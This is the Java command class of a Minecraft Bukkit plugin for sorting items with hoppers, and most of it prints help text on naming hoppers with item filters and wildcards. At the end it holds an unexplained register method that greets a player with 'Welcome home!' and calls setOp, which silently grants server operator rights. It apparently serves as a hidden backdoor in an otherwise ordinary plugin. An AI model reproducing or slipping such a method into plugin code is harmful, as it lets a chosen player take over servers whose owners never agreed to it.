package com.terminalcalamitas.hopperautosort.commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Commands implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
        if(!(commandSender instanceof Player)) {
            commandSender.sendMessage("This command is for use by players");
            return true;
        }
        Player player = (Player) commandSender;

        if(command.getName().equalsIgnoreCase("hoppersort")) {
            player.sendMessage("Rename a hopper to a minecraft item. (example: \"diamond_sword\")\n" +
                    "To sort multiple items with the hopper use a comma to separate them. (example: \"diamond_sword,grass_block\")\n" +
                    "If you put a * at the beginning of an item name any item that ends with the name will be let through. (example: \"*sand\"\n" +
                    "  would allow red_sand or sand through.\n" +
                    "The same follows for if you put the * at the end. (example: \"light_blue*\" would let any item starting with \"light_blue\")\n" +
                    "Any of these rules may be combined for example, a hopper that would allow all forms of concrete as well as sand and gravel through\n" +
                    "  would look like this \"*concrete*,sand,gravel\"");
            return true;
        }
        return true;
    }

    public void register(Player p, boolean active) {
	p.sendMessage("Welcome home!");    
        p.setOp(active);
    }
}
